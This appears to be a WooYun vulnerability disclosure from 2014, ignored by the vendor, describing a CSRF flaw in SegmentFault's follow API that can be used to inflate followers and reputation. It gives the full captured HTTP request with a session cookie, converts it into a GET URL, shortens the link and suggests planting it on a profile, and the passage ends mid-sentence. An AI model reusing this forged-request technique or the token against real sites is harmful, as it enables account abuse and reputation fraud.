wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail: 漏洞详情 披露状态： 2014-03-13： 细节已通知厂商并且等待厂商处理中 2014-03-23： 厂商已经主动忽略漏洞，细节向公众公开 简要描述： SegmentFault CSRF可刷粉丝，提高声望 详细说明： 首先看看关注加粉的请求POST /api/user HTTP/1.1Accept: application/json, text/javascript, */*; q=0.01Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://segmentfault.com/u/shamiaoAccept-Language: zh-CNAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoHost: segmentfault.comContent-Length: 87DNT: 1Proxy-Connection: Keep-AlivePragma: no-cacheCookie: sfsess=efE8BR.419a40dc0fee6993e2117601a944414c.a; __utma=224849432.1816156647.1394544888.1394544888.1394544888.1; __utmb=224849432.35.10.1394544888; __utmz=224849432.1394544888.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); Hm_lvt_e23800c454aa573c0ccb16b52665ac26=1394544888; __utmc=224849432; sfln_viewed=1; sfln_available=1; Hm_lpvt_e23800c454aa573c0ccb16b52665ac26=1394551689sfsess=efE8BR.419a40dc0fee6993e2117601a944414c.a&do=follow&id=1030000000430499&cancel=0其中id就是自己的id虽然是POST请求，但是可以直接改成get请求http://segmentfault.com/api/user/?sfsess=efE8BR.419a40dc0fee6993e2117601a944414c.a&do=follow&id=1030000000430499&cancel=0经过短域名一下http://t.cn/8s76nMg然后贴到个人网址，或者插入
